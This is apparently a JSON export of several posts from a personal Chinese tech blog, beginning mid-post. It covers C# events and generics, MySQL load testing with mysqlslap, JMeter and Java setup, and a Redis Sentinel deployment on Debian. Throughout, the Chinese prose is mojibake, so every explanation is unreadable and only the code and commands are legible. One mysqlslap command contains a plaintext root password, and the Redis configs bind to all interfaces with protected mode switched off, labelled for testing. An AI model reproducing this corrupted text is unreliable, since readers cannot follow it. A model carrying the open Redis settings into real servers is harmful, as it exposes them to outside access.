ä¸­ï¼Œäº‹ä»¶æ˜¯ä¸€ç§ç‰¹æ®Šçš„å§”æ‰˜ç±»å‹ï¼ˆå§”æ‰˜çš„ä¸€ä¸ªå˜é‡ï¼‰ï¼Œç”¨äºå®ç°å‘å¸ƒ-è®¢é˜…æ¨¡å¼ã€‚äº‹ä»¶å…è®¸ä¸€ä¸ªå¯¹è±¡ï¼ˆå‘å¸ƒè€…ï¼‰é€šçŸ¥å…¶ä»–å¯¹è±¡ï¼ˆè®¢é˜…è€…ï¼‰å‘ç”Ÿäº†æŸäº›äº‹æƒ…ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„ .NET äº‹ä»¶çš„ä¾‹å­ï¼Œæˆ‘ä»¬å°†åˆ›å»ºä¸€ä¸ªç®€å•çš„è®¡æ•°å™¨ç±» Counterï¼Œå½“è®¡æ•°è¾¾åˆ°ç‰¹å®šå€¼æ—¶è§¦å‘äº‹ä»¶ã€‚ å®šä¹‰äº‹ä»¶é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦å®šä¹‰ä¸€ä¸ªäº‹ä»¶å¤„ç†å™¨å§”æ‰˜ï¼Œç„¶ååœ¨ Counter ç±»ä¸­å£°æ˜ä¸€ä¸ªäº‹ä»¶ã€‚ 123456789101112131415161718192021222324252627282930313233 using System;// å®šä¹‰ä¸€ä¸ªäº‹ä»¶å¤„ç†ç¨‹åºå§”æ‰˜public delegate void ReachedEventHandler(object source, EventArgs e);// è®¡æ•°å™¨ç±»public class Counter&#123; // å®šä¹‰ä¸€ä¸ªäº‹ä»¶ public event ReachedEventHandler Reached; private int _count; // å¢åŠ è®¡æ•°çš„æ–¹æ³• public void Increment() &#123; _count++; Console.WriteLine($&quot;Count is now &#123;_count&#125;&quot;); // å½“è®¡æ•°è¾¾åˆ°æŸä¸ªå€¼æ—¶è§¦å‘äº‹ä»¶ if (_count &gt;= 5) &#123; OnReached(); &#125; &#125; // è§¦å‘äº‹ä»¶çš„æ–¹æ³• protected virtual void OnReached() &#123; Reached?.Invoke(this, EventArgs.Empty); &#125;&#125; ä½¿ç”¨äº‹ä»¶æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†åœ¨ä¸»ç¨‹åºä¸­åˆ›å»º Counter ç±»çš„å®ä¾‹ï¼Œå¹¶è®¢é˜…å…¶ Reached äº‹ä»¶ã€‚ 1234567891011121314151617181920212223 class Program&#123; static void Main(string[] args) &#123; var counter = new Counter(); // è®¢é˜…äº‹ä»¶ counter.Reached += Counter_Reached; // æ¨¡æ‹Ÿå¢åŠ è®¡æ•° for (int i = 0; i &lt; 6; i++) &#123; counter.Increment(); &#125; &#125; // äº‹ä»¶å¤„ç†æ–¹æ³• private static void Counter_Reached(object source, EventArgs e) &#123; Console.WriteLine(&quot;The count has reached the limit!&quot;); &#125;&#125; åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæ¯å½“è®¡æ•°å™¨çš„å€¼è¾¾åˆ°5æ—¶ï¼Œå°±ä¼šè§¦å‘ Reached äº‹ä»¶ã€‚è®¢é˜…äº†æ­¤äº‹ä»¶çš„å¯¹è±¡å°†æ¥æ”¶åˆ°é€šçŸ¥ï¼Œå¹¶å¯ä»¥æ‰§è¡Œç›¸åº”çš„æ“ä½œã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬çš„ä¸»ç¨‹åºè®¢é˜…äº†è¿™ä¸ªäº‹ä»¶ï¼Œå¹¶å®šä¹‰äº†ä¸€ä¸ªäº‹ä»¶å¤„ç†æ–¹æ³• Counter_Reachedï¼Œè¯¥æ–¹æ³•ä¼šåœ¨äº‹ä»¶è¢«è§¦å‘æ—¶è¾“å‡ºä¸€æ¡æ¶ˆæ¯ã€‚ è¿™æ˜¯ä¸€ä¸ªéå¸¸åŸºç¡€çš„ç¤ºä¾‹ï¼Œå®é™…åº”ç”¨ä¸­äº‹ä»¶å¯ä»¥æºå¸¦æ›´å¤šçš„ä¿¡æ¯ï¼Œä¾‹å¦‚é€šè¿‡è‡ªå®šä¹‰çš„äº‹ä»¶å‚æ•°ç±»æ¥ä¼ é€’æ•°æ®ç»™äº‹ä»¶å¤„ç†æ–¹æ³•ã€‚ æ³›å‹æ³›å‹å…è®¸ åœ¨å®šä¹‰æ–¹æ³•ã€ç±»æˆ–æ¥å£æ—¶ä¸æŒ‡å®šå…·ä½“çš„ç±»å‹ï¼Œè€Œæ˜¯åœ¨ä½¿ç”¨çš„æ—¶å€™å†æŒ‡å®šã€‚è¿™æ ·å¯ä»¥æé«˜ä»£ç çš„å¤ç”¨æ€§å’Œç±»å‹å®‰å…¨æ€§ã€‚ 123456789101112131415161718192021public class Box&lt;T&gt;&#123; private T item; public Box(T item) &#123; this.item = item; &#125; public T GetItem() &#123; return item; &#125;&#125;// ä½¿ç”¨ç¤ºä¾‹Box&lt;string&gt; stringBox = new Box&lt;string&gt;(&quot;Hello World&quot;);string content = stringBox.GetItem();Console.WriteLine(content);","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"c#","slug":"c","permalink":"https://banjinmei.github.io/tags/c/"},{"name":".NET","slug":"NET","permalink":"https://banjinmei.github.io/tags/NET/"}],"author":"mu"},{"title":"mysql å‹æµ‹","slug":"sql-å‹æµ‹","date":"2024-11-22T14:55:35.000Z","updated":"2024-11-29T19:08:14.327Z","comments":true,"path":"2024/11/22/sql-å‹æµ‹/","permalink":"https://banjinmei.github.io/2024/11/22/sql-%E5%8E%8B%E6%B5%8B/","excerpt":"","text":"mysqlslapæ˜¯ MySQL è‡ªå¸¦çš„ä¸€ä¸ªç”¨äºæ¨¡æ‹Ÿè´Ÿè½½å’Œæµ‹è¯•æ•°æ®åº“æ€§èƒ½çš„å‘½ä»¤è¡Œå·¥å…·ã€‚å®ƒå¯ä»¥å¸®åŠ©å¼€å‘è€…æˆ–æ•°æ®åº“ç®¡ç†å‘˜äº†è§£åœ¨ä¸åŒæ“ä½œæ¨¡å¼ä¸‹æ•°æ®åº“çš„è¡¨ç°æƒ…å†µï¼Œä»è€Œä¼˜åŒ–æ•°æ®åº“é…ç½®æˆ–æŸ¥è¯¢è¯­å¥ã€‚ä½¿ç”¨æ–¹æ³• åŸºæœ¬è¯­æ³•1mysqlslap [options] å¸¸ç”¨é€‰é¡¹â€“auto-generate-sql: è‡ªåŠ¨ç”Ÿæˆ SQL æµ‹è¯•æ•°æ®ï¼Œé»˜è®¤ä¸ºå¼€å¯çŠ¶æ€ã€‚â€“concurrency&#x3D;thread_count: æŒ‡å®šå¹¶å‘çº¿ç¨‹æ•°ï¼Œä¾‹å¦‚ â€“concurrency&#x3D;50 è¡¨ç¤ºåˆ›å»º 50 ä¸ªå¹¶å‘è¿æ¥ã€‚â€“iterations&#x3D;count: æŒ‡å®šæµ‹è¯•è¿­ä»£æ¬¡æ•°ï¼Œå³æ‰§è¡Œå¤šå°‘è½®æµ‹è¯•ã€‚â€“create-schema&#x3D;schema_name: åˆ›å»ºå¹¶ä½¿ç”¨æŒ‡å®šçš„ schema è¿›è¡Œæµ‹è¯•ã€‚â€“query&#x3D;query_file: ä½¿ç”¨æ–‡ä»¶ä¸­çš„ SQL è¯­å¥è¿›è¡Œæµ‹è¯•ã€‚â€“auto-generate-sql-add-auto-increment: å¯¹è‡ªåŠ¨ç”Ÿæˆçš„è¡¨æ·»åŠ è‡ªåŠ¨å¢é•¿å­—æ®µã€‚â€“auto-generate-sql-load-type&#x3D;type: æŒ‡å®šæµ‹è¯•çš„æ•°æ®åŠ è½½ç±»å‹ï¼Œå¯ä»¥æ˜¯ insert, update, delete, select æˆ– mixedã€‚â€“number-of-queries&#x3D;value: å½“ä½¿ç”¨ â€“auto-generate-sql å‚æ•°æ—¶ï¼Œè®¾ç½®æ¯ä¸ªçº¿ç¨‹æ‰§è¡Œçš„æŸ¥è¯¢æ•°é‡ã€‚â€“engine&#x3D;engine_name: æŒ‡å®šå­˜å‚¨å¼•æ“ï¼Œå¦‚ InnoDBã€MyISAM ç­‰ã€‚ç¤ºä¾‹ åŸºæœ¬å‹åŠ›æµ‹è¯•ï¼š1mysqlslap --concurrency=10 --iterations=3 --auto-generate-sql --engine=InnoDB è¿™æ¡å‘½ä»¤å°†å¯åŠ¨ä¸€ä¸ªä½¿ç”¨ InnoDB å­˜å‚¨å¼•æ“çš„å‹åŠ›æµ‹è¯•ï¼Œä½¿ç”¨ 10 ä¸ªå¹¶å‘è¿æ¥ï¼Œæ‰§è¡Œ 3 è½®æµ‹è¯•ï¼Œå¹¶è‡ªåŠ¨ç”Ÿæˆ SQL è¯­å¥ã€‚è‡ªå®šä¹‰æŸ¥è¯¢çš„å‹åŠ›æµ‹è¯•ï¼šå¦‚æœä½ æœ‰ä¸€ä¸ªåŒ…å«å¤šä¸ª SQL è¯­å¥çš„æ–‡ä»¶ test_queries.sqlï¼Œå¯ä»¥è¿™æ ·ä½¿ç”¨ï¼š 1mysqlslap --concurrency=5 --iterations=2 --query=test_queries.sql æ­¤å‘½ä»¤å°†ä½¿ç”¨ 5 ä¸ªå¹¶å‘è¿æ¥ï¼Œæ‰§è¡Œ 2 è½®æµ‹è¯•ï¼Œä½¿ç”¨ test_queries.sql æ–‡ä»¶ä¸­å®šä¹‰çš„ SQL è¯­å¥ã€‚ æ··åˆæ“ä½œçš„å‹åŠ›æµ‹è¯•ï¼šè‹¥è¦æµ‹è¯•æ’å…¥ã€æ›´æ–°ã€åˆ é™¤å’Œé€‰æ‹©æ“ä½œçš„æ··åˆè´Ÿè½½ï¼Œå¯ä»¥è¿™æ ·åšï¼š 1mysqlslap --concurrency=20 --iterations=1 --auto-generate-sql --auto-generate-sql-load-type=mixed --number-of-queries=1000 è¿™å°†å¯åŠ¨ä¸€ä¸ªæ··åˆæ“ä½œçš„æµ‹è¯•ï¼Œä½¿ç”¨ 20 ä¸ªå¹¶å‘è¿æ¥ï¼Œæ‰§è¡Œä¸€æ¬¡è¿­ä»£ï¼Œæ€»å…±æ‰§è¡Œ 1000 æ¡éšæœºç”Ÿæˆçš„ SQL è¯­å¥ã€‚ æ³¨æ„äº‹é¡¹åœ¨è¿›è¡Œå‹åŠ›æµ‹è¯•å‰ï¼Œè¯·ç¡®ä¿å¤‡ä»½é‡è¦æ•°æ®ï¼Œé¿å…æµ‹è¯•è¿‡ç¨‹ä¸­å¯¹ç”Ÿäº§ç¯å¢ƒé€ æˆå½±å“ã€‚æµ‹è¯•ç»“æœä¼šå—åˆ°æœåŠ¡å™¨ç¡¬ä»¶æ€§èƒ½ã€MySQL é…ç½®å‚æ•°ç­‰å¤šç§å› ç´ çš„å½±å“ï¼Œå› æ­¤æµ‹è¯•ç¯å¢ƒåº”å°½é‡æ¥è¿‘ç”Ÿäº§ç¯å¢ƒã€‚åˆ†ææµ‹è¯•ç»“æœæ—¶ï¼Œæ³¨æ„æŸ¥çœ‹é”™è¯¯ä¿¡æ¯ï¼Œä»¥ä¾¿åŠæ—¶å‘ç°æ½œåœ¨çš„é—®é¢˜ã€‚ æ’å…¥æ•°æ®æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å®ç°æ•°æ®æ’å…¥ï¼Œä¸ºæé«˜æ•ˆç‡è¿™é‡Œå¼€å¯ 10 ä¸ªå®¢æˆ·ç«¯çº¿ç¨‹åŒæ—¶æ’å…¥ï¼Œæ€»å…±æ‰§è¡Œ 1 ç™¾ä¸‡æ¬¡æ“ä½œï¼š mysqlslap -uroot -p 123123.zxcvb â€“concurrency&#x3D;10 â€“number-of-queries&#x3D;1000000 â€“create-schema&#x3D;IMDBâ€“query&#x3D;â€INSERT INTO people(name,age) VALUES (uuid(), RAND() * 100)â€ å¯¹userè¡¨è¿›è¡Œ 100000 æ’å…¥æµ‹è¯•123456789101112131415import randomimport stringdef generate_username(): return &#x27;&#x27;.join(random.choice(string.ascii_lowercase) for _ in range(8))def generate_email(): return f&quot;&#123;generate_username()&#125;@example.com&quot;with open(&#x27;insert_data.sql&#x27;, &#x27;w&#x27;) as f: for i in range(100000): username = generate_username() email = generate_email() f.write(f&quot;INSERT INTO User (username, email) VALUES (&#x27;&#123;username&#125;&#x27;, &#x27;&#123;email&#125;&#x27;);\\n&quot;) python ç”Ÿæˆinsert_data sql 1mysqlslap --concurrency=50 --iterations=1 --create-schema=test_db --query=insert_data.sql â€“concurrency&#x3D;50ï¼šä½¿ç”¨ 50 ä¸ªå¹¶å‘è¿æ¥ã€‚â€“iterations&#x3D;1ï¼šæ‰§è¡Œä¸€æ¬¡è¿­ä»£ã€‚â€“create-schema&#x3D;test_dbï¼šåˆ›å»ºå¹¶ä½¿ç”¨ test_db æ•°æ®åº“ã€‚â€“query&#x3D;insert_data.sqlï¼šä½¿ç”¨ insert_data.sql æ–‡ä»¶ä¸­çš„ SQL è¯­å¥ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"https://banjinmei.github.io/tags/mysql/"}],"author":"mu"},{"title":"Jmeter å‹æµ‹å·¥å…·","slug":"Jmeter-å‹æµ‹å·¥å…·","date":"2024-11-22T14:53:27.000Z","updated":"2024-11-22T14:54:54.773Z","comments":true,"path":"2024/11/22/Jmeter-å‹æµ‹å·¥å…·/","permalink":"https://banjinmei.github.io/2024/11/22/Jmeter-%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7/","excerpt":"","text":"JMeterä¸‹è½½åœ°å€ï¼š Apache JMeterhttps://jmeter.apache.org/download_jmeter.cgi é€‰æ‹©äºŒè¿›åˆ¶åŒ…ä¸‹è½½åè§£å‹ï¼ŒåŒå‡»&#x2F;bin&#x2F;jmeter.batï¼ˆä¾èµ–javaç¯å¢ƒï¼‰ è¯­è¨€è®¾ç½®å¯ä»¥åœ¨Options&#x2F;Choose Languageå°†è¯­è¨€è®¾ç½®ä¸ºä¸­æ–‡ åˆ›å»ºçº¿ç¨‹ç»„å³é”®Test PlanTest Plan-&gt;æ·»åŠ -&gt;çº¿ç¨‹ï¼ˆç”¨æˆ·ï¼‰-&gt;çº¿ç¨‹ç»„ åç§°ï¼šçº¿ç¨‹ç»„åç§°æ³¨é‡Šï¼ˆå¯é€‰è®¾ç½®ï¼‰çº¿ç¨‹æ•°ï¼šå¯ä»¥ç”¨ä½œæ˜¯ç”¨æˆ·æ•°ï¼Œå³å¤šå°‘ä¸ªåŒæ—¶å¹¶å‘å‘APIå‘é€è¯·æ±‚Ramp-Upæ—¶é—´ï¼šåœ¨è®¾å®šçš„æ—¶é—´å†…å¯åŠ¨ä¸Šé¢è®¾ç½®çš„çº¿ç¨‹æ•°å¾ªç¯æ¬¡æ•°ï¼šå³ä¸€ä¸ªçº¿ç¨‹å‘é€è®¾å®šçš„è¯·æ±‚ï¼Œå¯ä»¥å‹¾é€‰æ°¸è¿œï¼Œè¿™æ ·çº¿ç¨‹å°±ä¼šä¸€ç›´å‘é€APIè¯·æ±‚ æ·»åŠ HTTPè¯·æ±‚å³é”®çº¿ç¨‹ç»„çº¿ç¨‹ç»„-&gt;æ·»åŠ -&gt;å–æ ·å™¨-&gt;HTTPè¯·æ±‚ è®¾ç½®HTTPè¯·æ±‚åç§°ï¼šæ¥å£åç§°æ³¨é‡Šï¼ˆå¯é€‰ï¼‰åè®®ï¼šhttp&#x2F;httpsæœåŠ¡å™¨åç§°æˆ–IPï¼šæœåŠ¡å™¨åŸŸåæˆ–IPåœ°å€ç«¯å£å·ï¼šwebç¨‹åºç›‘å¬çš„ç«¯å£å·è¯·æ±‚æ–¹æ³•ï¼šGET&#x2F;POST&#x2F;â€¦è·¯å¾„ï¼šAPIæ¥å£è·¯å¾„ æ·»åŠ HTTPè¯·æ±‚å¤´å³é”®çº¿ç¨‹ç»„çº¿ç¨‹ç»„-&gt;æ·»åŠ -&gt;é…ç½®å…ƒä»¶-&gt;HTTPä¿¡æ¯å¤´ è®¾ç½®æ¥å£çš„HTTPè¯·æ±‚å¤´ æ·»åŠ ç›‘å¬å™¨æŸ¥çœ‹ç»“æœæ ‘ï¼šå¯ä»¥æŸ¥çœ‹è¯·æ±‚å“åº”æ˜¯å¦æˆåŠŸï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°å“åº”å†…å­˜ çº¿ç¨‹ç»„-&gt;æ·»åŠ -&gt;ç›‘å¬å™¨-&gt;æŸ¥çœ‹ç»“æ„æ ‘ TCPçº¿ç¨‹ç»„-&gt;æ·»åŠ -&gt;å–æ ·å™¨-&gt; TCPå–æ ·å™¨SERVER IP ç«¯å£ å‘é€æ–‡æœ¬ javaç¯å¢ƒåœ¨Windowsä¸Šå®‰è£…Javaç¯å¢ƒé€šå¸¸æ¶‰åŠåˆ°ä¸¤ä¸ªä¸»è¦æ­¥éª¤ï¼šå®‰è£…Javaè¿è¡Œç¯å¢ƒï¼ˆJREï¼‰æˆ–å¼€å‘å·¥å…·åŒ…ï¼ˆJDKï¼‰ï¼Œä»¥åŠè®¾ç½®ç¯å¢ƒå˜é‡ã€‚ä»¥ä¸‹æ˜¯è¯¦ç»†çš„æ­¥éª¤è¯´æ˜ï¼š 1. ä¸‹è½½JDKé¦–å…ˆï¼Œéœ€è¦ä»Oracleå®˜ç½‘æˆ–å…¶ä»–å¯ä¿¡çš„æ¥æºä¸‹è½½æœ€æ–°çš„JDKç‰ˆæœ¬ã€‚è®¿é—®Oracle JDKä¸‹è½½é¡µé¢ï¼Œhttps://www.oracle.com/java/technologies/downloads/#java17 é€‰æ‹©é€‚åˆçš„æ“ä½œç³»ç»Ÿçš„ç‰ˆæœ¬è¿›è¡Œä¸‹è½½ã€‚æ³¨æ„ï¼Œé¡µé¢ä¸Šçš„é“¾æ¥å¯èƒ½ä¼šéšç€æ–°ç‰ˆæœ¬çš„å‘å¸ƒè€Œå˜åŒ–ã€‚ 2. å®‰è£…JDKåŒå‡»ä¸‹è½½å¥½çš„å®‰è£…æ–‡ä»¶å¼€å§‹å®‰è£…è¿‡ç¨‹ã€‚åœ¨å®‰è£…è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥é€‰æ‹©è‡ªå®šä¹‰å®‰è£…è·¯å¾„ã€‚å»ºè®®é€‰æ‹©ä¸€ä¸ªå®¹æ˜“è®°ä½çš„ä½ç½®ï¼Œæ¯”å¦‚ C:\\Program Files\\Java\\jdk-xxï¼ˆå…¶ä¸­ xx æ˜¯å®‰è£…çš„JDKç‰ˆæœ¬å·ï¼‰ã€‚æŒ‰ç…§æç¤ºå®Œæˆå®‰è£…ã€‚ 3. è®¾ç½®ç¯å¢ƒå˜é‡ä¸ºäº†èƒ½å¤Ÿåœ¨å‘½ä»¤è¡Œä¸­ä»»æ„ä½ç½®ä½¿ç”¨ java å’Œ javac å‘½ä»¤ï¼Œéœ€è¦é…ç½®ç³»ç»Ÿç¯å¢ƒå˜é‡ã€‚ æ‰“å¼€ç³»ç»Ÿå±æ€§ï¼šå³é”®ç‚¹å‡»â€œæ­¤ç”µè„‘â€æˆ–â€œæˆ‘çš„ç”µè„‘â€ï¼Œé€‰æ‹©â€œå±æ€§â€ã€‚ç‚¹å‡»â€œé«˜çº§ç³»ç»Ÿè®¾ç½®â€ã€‚åœ¨â€œé«˜çº§â€é€‰é¡¹å¡ä¸‹ï¼Œç‚¹å‡»â€œç¯å¢ƒå˜é‡â€ã€‚è®¾ç½®JAVA_HOMEï¼šåœ¨â€œç³»ç»Ÿå˜é‡â€éƒ¨åˆ†ï¼Œç‚¹å‡»â€œæ–°å»ºâ€ï¼Œç„¶åæ·»åŠ å˜é‡åä¸º JAVA_HOMEã€‚å°†å˜é‡å€¼è®¾ä¸ºJDKçš„å®‰è£…ç›®å½•ï¼Œä¾‹å¦‚ C:\\Program Files\\Java\\jdk-xxã€‚ä¿®æ”¹Pathå˜é‡ï¼šæ‰¾åˆ°å¹¶é€‰ä¸­â€œç³»ç»Ÿå˜é‡â€ä¸­çš„ Path å˜é‡ï¼Œç„¶åç‚¹å‡»â€œç¼–è¾‘â€ã€‚æ·»åŠ ä¸€ä¸ªæ–°çš„æ¡ç›®ï¼Œå…¶å€¼ä¸º %JAVA_HOME%\\binã€‚è¿™ä½¿å¾—ç³»ç»Ÿå¯ä»¥åœ¨ä»»ä½•åœ°æ–¹è¯†åˆ« java å’Œ javac å‘½ä»¤ã€‚ 4. éªŒè¯å®‰è£…æ‰“å¼€å‘½ä»¤æç¤ºç¬¦ï¼ˆCMDï¼‰ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤æ¥éªŒè¯å®‰è£…æ˜¯å¦æˆåŠŸï¼š è¾“å…¥ java -version æŸ¥çœ‹Javaç‰ˆæœ¬ä¿¡æ¯ã€‚è¾“å…¥ javac -version æŸ¥çœ‹Javaç¼–è¯‘å™¨ç‰ˆæœ¬ä¿¡æ¯ã€‚å¦‚æœèƒ½å¤Ÿæ­£ç¡®æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ï¼Œåˆ™è¡¨ç¤ºJavaç¯å¢ƒå·²ç»æˆåŠŸå®‰è£…å¹¶ä¸”é…ç½®æ­£ç¡®ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"jmeter","slug":"jmeter","permalink":"https://banjinmei.github.io/tags/jmeter/"},{"name":"jvav","slug":"jvav","permalink":"https://banjinmei.github.io/tags/jvav/"}],"author":"mu"},{"title":"redis sentinel cluster","slug":"redis-sentinel-cluster","date":"2024-11-22T14:18:29.000Z","updated":"2024-11-22T14:37:47.028Z","comments":true,"path":"2024/11/22/redis-sentinel-cluster/","permalink":"https://banjinmei.github.io/2024/11/22/redis-sentinel-cluster/","excerpt":"","text":"Debian æœåŠ¡å™¨ä¸Šéƒ¨ç½²åˆ†å¸ƒå¼ Redis å¯ä»¥å®ç°é«˜å¯ç”¨æ€§æˆ–è´Ÿè½½å‡è¡¡ï¼Œå…·ä½“å¯ä»¥é€‰æ‹©ä»¥ä¸‹ä¸¤ç§æ–¹æ¡ˆä¹‹ä¸€ï¼š ä¸»ä»å¤åˆ¶ (Master-Slave Replication)ä¸»ä»å¤åˆ¶ç”¨äºæ•°æ®å†—ä½™å¤‡ä»½å’Œè¯»å†™åˆ†ç¦»ï¼Œä½†å¹¶ä¸æä¾›è‡ªåŠ¨æ•…éšœåˆ‡æ¢åŠŸèƒ½ã€‚ Redis Sentinel (å“¨å…µæ¨¡å¼)Redis Sentinel åœ¨ä¸»ä»å¤åˆ¶çš„åŸºç¡€ä¸Šå¢åŠ äº†è‡ªåŠ¨æ•…éšœåˆ‡æ¢åŠŸèƒ½ï¼Œç”¨äºå®ç°é«˜å¯ç”¨æ€§ã€‚ Redis Cluster (é›†ç¾¤æ¨¡å¼)Redis Cluster æ˜¯ä¸€ç§åˆ†å¸ƒå¼éƒ¨ç½²æ–¹å¼ï¼Œæ”¯æŒæ•°æ®åˆ†ç‰‡å’Œé«˜å¯ç”¨æ€§ï¼Œé€‚ç”¨äºéœ€è¦æ‰©å±•æ€§çš„åœºæ™¯ã€‚ Redis Sentinel éƒ¨ç½²æ¶æ„ä¸¤å°æœåŠ¡å™¨ï¼šä¸» Redis æœåŠ¡å™¨ï¼ˆå‡è®¾ IPï¼š192.168.1.101ï¼‰ä» Redis æœåŠ¡å™¨ï¼ˆå‡è®¾ IPï¼š192.168.1.102ï¼‰Sentinel å“¨å…µè¿›ç¨‹ï¼šæ¯å°æœåŠ¡å™¨è¿è¡Œä¸€ä¸ª Sentinel è¿›ç¨‹ï¼Œç”¨äºç›‘æ§å’Œæ•…éšœåˆ‡æ¢ã€‚ æ­¥éª¤ 1ï¼šå®‰è£… Redisåœ¨ä¸¤å°æœåŠ¡å™¨ä¸Šåˆ†åˆ«å®‰è£… Redisï¼š 12sudo apt updatesudo apt install redis-server éªŒè¯ Redis ç‰ˆæœ¬ï¼š 1redis-server --version æ­¥éª¤ 2ï¼šé…ç½® Redis ä¸»ä»å¤åˆ¶åœ¨ä¸»æœåŠ¡å™¨ (192.168.1.101) ä¸Šç¼–è¾‘ Redis é…ç½®æ–‡ä»¶ &#x2F;etc&#x2F;redis&#x2F;redis.confï¼š 123bind 0.0.0.0 # å…è®¸å¤–éƒ¨è®¿é—®protected-mode no # å…³é—­ä¿æŠ¤æ¨¡å¼ï¼ˆæµ‹è¯•ç¯å¢ƒä½¿ç”¨ï¼‰appendonly yes # å¼€å¯æŒä¹…åŒ– å¯åŠ¨ Redis æœåŠ¡ï¼š 1sudo systemctl restart redis åœ¨ä»æœåŠ¡å™¨ (192.168.1.102) ä¸Šç¼–è¾‘ Redis é…ç½®æ–‡ä»¶ &#x2F;etc&#x2F;redis&#x2F;redis.confï¼š 123456bind 0.0.0.0protected-mode noappendonly yes# è®¾ç½®ä¸ºä¸»æœåŠ¡å™¨çš„ä»èŠ‚ç‚¹replicaof 192.168.1.101 6379 å¯åŠ¨ Redis æœåŠ¡ï¼š 1sudo systemctl restart redis éªŒè¯ä¸»ä»å¤åˆ¶åœ¨ä¸»æœåŠ¡å™¨ä¸Šè®¾ç½®ä¸€ä¸ªæµ‹è¯•é”®ï¼š 12redis-cliset mykey &quot;hello_redis&quot; åœ¨ä»æœåŠ¡å™¨ä¸Šè¯»å–ï¼š 123redis-cliget mykey# è¿”å› &quot;hello_redis&quot; æ­¥éª¤ 3ï¼šé…ç½® Redis Sentinelåœ¨ä¸¤å°æœåŠ¡å™¨ä¸Šé…ç½® Redis Sentinelã€‚Redis è‡ªå¸¦ Sentinel äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸éœ€è¦é¢å¤–å®‰è£…ã€‚ é…ç½®ä¸»æœåŠ¡å™¨çš„ Sentinelç¼–è¾‘ &#x2F;etc&#x2F;redis&#x2F;sentinel.confï¼š 1234567891011121314bind 0.0.0.0 # å…è®¸å¤–éƒ¨è®¿é—®protected-mode no # å…³é—­ä¿æŠ¤æ¨¡å¼ï¼ˆæµ‹è¯•ç¯å¢ƒä½¿ç”¨ï¼‰# ç›‘æ§ä¸»èŠ‚ç‚¹ï¼Œè®¾ç½® quorum ä¸º 2sentinel monitor mymaster 192.168.1.101 6379 2# å¦‚æœä¸»èŠ‚ç‚¹åœ¨ 5 ç§’å†…æ— å“åº”ï¼Œåˆ™è®¤ä¸ºå…¶å¤±æ•ˆsentinel down-after-milliseconds mymaster 5000# è®¾ç½®æ•…éšœåˆ‡æ¢çš„è¶…æ—¶æ—¶é—´sentinel failover-timeout mymaster 10000# å¦‚æœä¸»èŠ‚ç‚¹æœ‰å¯†ç ï¼Œéœ€æ·»åŠ ä»¥ä¸‹é…ç½®# sentinel auth-pass mymaster &lt;password&gt; é…ç½®ä»æœåŠ¡å™¨çš„ Sentinelåœ¨ä»æœåŠ¡å™¨ä¸Šï¼Œé…ç½® &#x2F;etc&#x2F;redis&#x2F;sentinel.confï¼Œå†…å®¹ä¸ä¸»æœåŠ¡å™¨ä¸€è‡´ã€‚ æ­¥éª¤ 4ï¼šå¯åŠ¨ Redis Sentinelåœ¨ä¸¤å°æœåŠ¡å™¨ä¸Šå¯åŠ¨ Sentinelï¼š 1redis-server /etc/redis/sentinel.conf --sentinel æ£€æŸ¥æ˜¯å¦å¯åŠ¨æˆåŠŸï¼š 1ps aux | grep redis åº”è¯¥èƒ½çœ‹åˆ° Redis Sentinel è¿›ç¨‹è¿è¡Œã€‚ æ­¥éª¤ 5ï¼šæµ‹è¯•é«˜å¯ç”¨æ€§æ¨¡æ‹Ÿä¸»èŠ‚ç‚¹æ•…éšœåœ¨ä¸»æœåŠ¡å™¨ä¸Šåœæ­¢ Redis æœåŠ¡ï¼š 1sudo systemctl stop redis Sentinel æ£€æµ‹åˆ°ä¸»èŠ‚ç‚¹ä¸å¯ç”¨åï¼Œä¼šè‡ªåŠ¨å°†ä»èŠ‚ç‚¹ï¼ˆ192.168.1.102ï¼‰æå‡ä¸ºä¸»èŠ‚ç‚¹ã€‚ éªŒè¯æ•…éšœåˆ‡æ¢åœ¨ Sentinel ä¸­æŸ¥çœ‹æ–°çš„ä¸»èŠ‚ç‚¹ï¼š 12redis-cli -p 26379SENTINEL get-master-addr-by-name mymaster åº”è¿”å›ä»èŠ‚ç‚¹çš„ IP å’Œç«¯å£ï¼ˆ192.168.1.102:6379ï¼‰ã€‚ æ¢å¤ä¸»èŠ‚ç‚¹å¯åŠ¨ä¸»èŠ‚ç‚¹æœåŠ¡ï¼š 1sudo systemctl start redis ä¸»èŠ‚ç‚¹ä¼šè‡ªåŠ¨æˆä¸ºæ–°çš„ä»èŠ‚ç‚¹ï¼Œé‡æ–°åŠ å…¥é›†ç¾¤ã€‚ é™„åŠ ï¼šå¸¸ç”¨å‘½ä»¤æŸ¥çœ‹ Sentinel ç›‘æ§çš„æ‰€æœ‰èŠ‚ç‚¹ï¼š 12redis-cli -p 26379SENTINEL masters æŸ¥çœ‹ç‰¹å®šä¸»èŠ‚ç‚¹çš„æ‰€æœ‰ä»èŠ‚ç‚¹ï¼š 12redis-cli -p 26379SENTINEL slaves mymaster æ‰‹åŠ¨è§¦å‘æ•…éšœåˆ‡æ¢ï¼š 12redis-cli -p 26379SENTINEL failover mymaster éƒ¨ç½²æ€»ç»“Redis Sentinel å®ç°äº†ä¸»ä»å¤åˆ¶çš„ç›‘æ§å’Œè‡ªåŠ¨æ•…éšœåˆ‡æ¢ï¼Œå…¶æ ¸å¿ƒæ˜¯ï¼š 